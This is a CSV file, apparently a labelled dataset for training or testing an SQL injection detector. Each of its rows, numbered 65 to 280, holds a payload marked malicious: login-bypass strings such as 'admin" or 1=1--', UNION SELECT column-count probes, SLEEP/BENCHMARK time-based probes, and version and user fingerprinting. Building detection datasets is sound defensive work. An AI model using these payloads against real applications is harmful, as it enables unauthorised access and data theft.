,payload,is_malicious,injection_type
65,"admin"" or 1=1--",1,SQL
66,"admin"" or 1=1#",1,SQL
67,"admin"" or 1=1/*",1,SQL
68,"admin"") or (""1""=""1",1,SQL
69,"admin"") or (""1""=""1""--",1,SQL
70,"admin"") or (""1""=""1""#",1,SQL
71,"admin"") or (""1""=""1""/*",1,SQL
72,"admin"") or ""1""=""1",1,SQL
73,"admin"") or ""1""=""1""--",1,SQL
74,"admin"") or ""1""=""1""#",1,SQL
75,"admin"") or ""1""=""1""/*",1,SQL
76,"1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1,SQL
77,ORDER BY SLEEP(5),1,SQL
78,"ORDER BY 1,SLEEP(5)",1,SQL
79,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))",1,SQL
80,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4",1,SQL
81,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5",1,SQL
82,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6",1,SQL
83,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7",1,SQL
84,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8",1,SQL
85,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9",1,SQL
86,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10",1,SQL
87,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11",1,SQL
88,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12",1,SQL
89,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13",1,SQL
90,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14",1,SQL
91,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14",1,SQL
92,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15",1,SQL
93,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16",1,SQL
94,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17",1,SQL
95,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",1,SQL
96,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",1,SQL
97,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",1,SQL
98,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",1,SQL
99,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",1,SQL
100,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",1,SQL
101,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",1,SQL
102,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",1,SQL
103,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",1,SQL
104,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",1,SQL
105,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",1,SQL
106,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",1,SQL
107,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",1,SQL
108,ORDER BY SLEEP(5)#,1,SQL
109,"ORDER BY 1,SLEEP(5)#",1,SQL
110,"ORDER BY 1,SLEEP(5),3#",1,SQL
111,"ORDER BY 1,SLEEP(5),3,4#",1,SQL
112,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#",1,SQL
113,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#",1,SQL
114,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#",1,SQL
115,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#",1,SQL
116,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#",1,SQL
117,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#",1,SQL
118,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#",1,SQL
119,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#",1,SQL
120,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#",1,SQL
121,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#",1,SQL
122,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#",1,SQL
123,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#",1,SQL
124,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#",1,SQL
125,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#",1,SQL
126,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",1,SQL
127,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",1,SQL
128,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",1,SQL
129,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",1,SQL
130,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",1,SQL
131,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",1,SQL
132,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",1,SQL
133,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",1,SQL
134,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",1,SQL
135,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",1,SQL
136,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",1,SQL
137,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",1,SQL
138,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",1,SQL
139,ORDER BY SLEEP(5)--,1,SQL
140,"ORDER BY 1,SLEEP(5)--",1,SQL
141,"ORDER BY 1,SLEEP(5),3--",1,SQL
142,"ORDER BY 1,SLEEP(5),3,4--",1,SQL
143,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5--",1,SQL
144,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6--",1,SQL
145,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7--",1,SQL
146,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8--",1,SQL
147,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9--",1,SQL
148,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10--",1,SQL
149,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11--",1,SQL
150,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12--",1,SQL
151,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13--",1,SQL
152,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14--",1,SQL
153,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14--",1,SQL
154,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15--",1,SQL
155,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--",1,SQL
156,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17--",1,SQL
157,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--",1,SQL
158,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--",1,SQL
159,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--",1,SQL
160,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--",1,SQL
161,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--",1,SQL
162,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--",1,SQL
163,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--",1,SQL
164,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--",1,SQL
165,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--",1,SQL
166,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--",1,SQL
167,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--",1,SQL
168,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--",1,SQL
169,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--",1,SQL
170,UNION ALL SELECT 1,1,SQL
171,"UNION ALL SELECT 1,2",1,SQL
172,"UNION ALL SELECT 1,2,3",1,SQL
173,"UNION ALL SELECT 1,2,3,4",1,SQL
174,"UNION ALL SELECT 1,2,3,4,5",1,SQL
175,"UNION ALL SELECT 1,2,3,4,5,6",1,SQL
176,"UNION ALL SELECT 1,2,3,4,5,6,7",1,SQL
177,"UNION ALL SELECT 1,2,3,4,5,6,7,8",1,SQL
178,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9",1,SQL
179,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10",1,SQL
180,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11",1,SQL
181,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12",1,SQL
182,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13",1,SQL
183,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14",1,SQL
184,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15",1,SQL
185,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16",1,SQL
186,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17",1,SQL
187,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",1,SQL
188,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",1,SQL
189,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",1,SQL
190,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",1,SQL
191,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",1,SQL
192,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",1,SQL
193,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",1,SQL
194,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",1,SQL
195,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",1,SQL
196,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",1,SQL
197,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",1,SQL
198,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",1,SQL
199,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",1,SQL
200,UNION ALL SELECT 1#,1,SQL
201,"UNION ALL SELECT 1,2#",1,SQL
202,"UNION ALL SELECT 1,2,3#",1,SQL
203,"UNION ALL SELECT 1,2,3,4#",1,SQL
204,"UNION ALL SELECT 1,2,3,4,5#",1,SQL
205,"UNION ALL SELECT 1,2,3,4,5,6#",1,SQL
206,"UNION ALL SELECT 1,2,3,4,5,6,7#",1,SQL
207,"UNION ALL SELECT 1,2,3,4,5,6,7,8#",1,SQL
208,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9#",1,SQL
209,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#",1,SQL
210,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#",1,SQL
211,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#",1,SQL
212,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#",1,SQL
213,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#",1,SQL
214,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#",1,SQL
215,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#",1,SQL
216,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#",1,SQL
217,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",1,SQL
218,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",1,SQL
219,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",1,SQL
220,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",1,SQL
221,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",1,SQL
222,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",1,SQL
223,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",1,SQL
224,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",1,SQL
225,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",1,SQL
226,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",1,SQL
227,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",1,SQL
228,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",1,SQL
229,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",1,SQL
230,UNION ALL SELECT 1--,1,SQL
231,"UNION ALL SELECT 1,2--",1,SQL
232,"UNION ALL SELECT 1,2,3--",1,SQL
233,"UNION ALL SELECT 1,2,3,4--",1,SQL
234,"UNION ALL SELECT 1,2,3,4,5--",1,SQL
235,"UNION ALL SELECT 1,2,3,4,5,6--",1,SQL
236,"UNION ALL SELECT 1,2,3,4,5,6,7--",1,SQL
237,"UNION ALL SELECT 1,2,3,4,5,6,7,8--",1,SQL
238,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9--",1,SQL
239,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--",1,SQL
240,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11--",1,SQL
241,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12--",1,SQL
242,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--",1,SQL
243,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14--",1,SQL
244,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--",1,SQL
245,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--",1,SQL
246,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--",1,SQL
247,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--",1,SQL
248,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--",1,SQL
249,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--",1,SQL
250,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--",1,SQL
251,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--",1,SQL
252,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--",1,SQL
253,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--",1,SQL
254,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--",1,SQL
255,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--",1,SQL
256,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--",1,SQL
257,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--",1,SQL
258,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--",1,SQL
259,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--",1,SQL
260,"UNION SELECT @@VERSION,SLEEP(5),3",1,SQL
261,"UNION SELECT @@VERSION,SLEEP(5),USER(),4",1,SQL
262,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5",1,SQL
263,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6",1,SQL
264,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7",1,SQL
265,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8",1,SQL
266,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9",1,SQL
267,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10",1,SQL
268,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11",1,SQL
269,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12",1,SQL
270,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13",1,SQL
271,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14",1,SQL
272,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15",1,SQL
273,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16",1,SQL
274,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17",1,SQL
275,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18",1,SQL
276,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",1,SQL
277,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",1,SQL
278,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",1,SQL
279,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",1,SQL
280,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",1,SQL
